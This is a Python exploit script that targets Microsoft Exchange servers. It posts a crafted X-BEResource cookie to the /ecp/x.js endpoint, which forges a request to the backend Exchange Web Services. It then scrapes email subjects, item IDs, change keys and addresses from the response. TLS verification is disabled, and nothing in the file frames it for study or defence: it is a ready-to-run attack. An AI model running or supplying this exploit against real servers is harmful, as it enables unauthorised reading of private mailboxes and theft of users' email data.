import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(url):
  vuln = url + '/ecp/x.js'
  headers = {
  'User-Agent': 'Hello-World',
  'Cookie': 'X-BEResource=ID-EXMB07/EWS/Exchange.asmx?a=~1942062522;',
  'Accept-Language': 'en',
  'Content-Type': 'text/xml'
  }
  data = open('payload.yml').read()
  req = requests.post(vuln,headers=headers,data=data, verify=False)
  if req.status_code == 200:
    print(req.status_code)
    print(req.headers)
    tree = """%s"""%(req.text)
    subject = re.findall('(?:<t:Subject>)(.+?)(?:</t:Subject>)', tree)
    id = re.findall('(?:t\:ItemId\sId=")(.+?)(?:")', tree)
    key = re.findall('(?:t\:ItemId\sId=".+?"\sChangeKey=")(.+?)(?:")', tree)
    email = re.findall('(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)', tree)
    for i in subject:
      print('+ '+i)
    print('-------------')
    for ids in id:
      print('+ '+ids)
    print('-------------')
    for k in key:
      print('+ '+k)
    print('-------------')
    for e in email:
      print('+ '+e)
  else:
    print(req.status_code)
    print(req.headers)
    print(req.text)
exploit(sys.argv[1])